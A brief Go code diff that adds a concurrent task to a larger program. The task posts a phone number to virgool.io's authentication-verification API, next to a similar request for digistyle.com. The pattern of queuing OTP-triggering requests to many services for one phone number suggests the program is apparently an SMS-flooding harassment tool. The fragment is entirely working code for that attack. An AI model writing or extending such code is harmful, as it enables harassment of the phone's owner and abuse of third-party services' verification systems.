@@ -244,6 +244,12 @@ func main() {
 
 
 
+		wg.Add(1) // virgool.io (JSON) 
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+				"identifier": phone,
+			}, &wg, ch)
+		}
 		wg.Add(1) // digistyle.com (Form)
 		tasks <- func() {
 			formData := url.Values{}
